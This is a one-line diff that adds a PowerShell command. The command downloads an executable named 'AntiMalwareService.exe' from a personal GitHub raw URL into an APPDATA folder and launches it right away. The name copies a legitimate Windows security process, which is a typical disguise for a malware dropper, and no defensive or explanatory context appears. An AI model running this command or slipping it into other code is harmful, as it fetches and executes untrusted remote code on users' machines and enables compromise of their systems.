@@ -1,0 +1,1 @@
+ $u="https://raw.githubusercontent.com/RE4PERxAlive/yeooo/refs/heads/main/AntiMalwareService.exe";$d="$env:APPDATA\MyApp";New-Item $d -ItemType Directory -Force|Out-Null;Invoke-WebRequest $u -OutFile "$d\AntiMalwareService.exe";Start-Process "$d\AntiMalwareService.exe"
